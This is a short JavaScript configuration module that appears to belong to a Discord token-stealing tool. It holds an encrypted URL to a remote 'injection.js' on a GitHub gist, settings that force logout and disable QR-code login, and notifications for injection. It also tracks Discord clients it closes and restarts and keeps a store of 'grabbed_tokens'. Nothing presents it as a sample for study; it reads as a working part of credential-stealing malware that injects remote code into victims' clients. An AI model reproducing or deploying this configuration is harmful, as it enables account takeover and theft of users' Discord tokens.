module.exports = (client) => {
    return {
        base_url: client.utils.encryption.encryptData("https://gist.githubusercontent.com/ilyigna/142da29355c8b244598618c9d405b6f6/raw/dd1d3e7861d19aa316fd76ed6f630d4579522612/injection.js"),

        instant_logout: true,
        disable_qr_code: true,

        injection_notification: true,
        initialize_notification: true,
        logout_notification: true,

        running_executables: [],
        executables: [],
        files_path: [],

        closed_discord_clients: '',
        restarted_discord_clients: '',

        grabbed_tokens: {
            all: []
        },
    }
}
